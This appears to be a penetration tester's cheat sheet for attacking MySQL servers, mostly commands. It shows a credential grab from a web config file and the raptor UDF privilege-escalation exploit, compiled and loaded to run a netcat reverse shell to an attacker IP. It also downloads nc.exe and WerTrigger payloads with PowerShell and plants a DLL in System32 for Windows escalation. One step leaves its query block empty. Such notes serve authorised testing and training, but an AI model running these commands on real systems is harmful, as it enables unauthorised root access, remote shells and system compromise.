#scripts #database

### Basic Commands

```sql
select version();
```

```sql
select system_user();
```

```sql
show databases;
```

```sql
use data;
```

```sql
select * from Users WHERE u = 'h';
```

### Connect

```bash
mysql -h 127.0.0.1 -u root -P 30000
```
### Find the passwords

```bash
cat /var/www/config.php
```
### MYSQL Shell from Credentials

#### When you have access to the MYSQL/PHPMyadmin

1. FInd or guess the webroot ( In phpinfo.php document_root)
2. Create a database
3. Execute the below query
```bash

```

#### With Raptor(Mostly linux since compiling is needed) 
1. Confirm the vulnerability, and mysql service will be running as root
```bash
ps aux | grep mysql
```
2. Check the version(Vulnerable 5.7.30 and below)
```bash
select @@version
```
3. Create the exploit
```bash
searchsploit -m 1518
```
transfer file to victim if doesn't have compilation rights do it in kali

```bash
wget http://192.168.45.156:21/1518.c
```

```bash
gcc -g -c 1518.c -o raptor_udf.o -fPIC
```

```bash
gcc -g -shared -Wl,-soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
```

```bash
chmod 777 raptor_udf.so
```
4.  Time to exploit
```bash
 mysql --host=127.0.0.1 -u root -p 
```

```bash
use mysql;
```

```bash
create table foo(line blob);
```

```bash
insert into foo values(load_file('/dev/shm/raptor_udf.so'));
```

```bash
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf.so';
```

```bash
create function do_system returns integer soname 'raptor_udf.so';
```

```bash
select do_system('/bin/nc -e /bin/bash 192.168.45.156 8080');
```

#### With Privileged File Write

1. Test if its working
```mysql
select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
```
2. get the files to victim
```powershell
iwr -uri http://192.168.45.228:80/nc.exe -OutFile ./nc.exe
```

```powershell
iwr -uri http://192.168.45.228:80/WerTrigger/bin/phoneinfo.dll -OutFile ./phoneinfo.dll
```


```powershell
iwr -uri http://192.168.45.228:80/WerTrigger/bin/Report.wer -OutFile ./Report.wer
```


```powershell
iwr -uri http://192.168.45.228:80/WerTrigger/bin/WerTrigger.exe -OutFile ./WerTrigger.exe
```

3. Write the file to system32 directory
```mysql
select load_file('C:\\xampp\\htdocs\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
```
4. Execute the wertrigger file

🔴 All three files should be in the same directory
```powershell
.\WerTrigger.exe
```

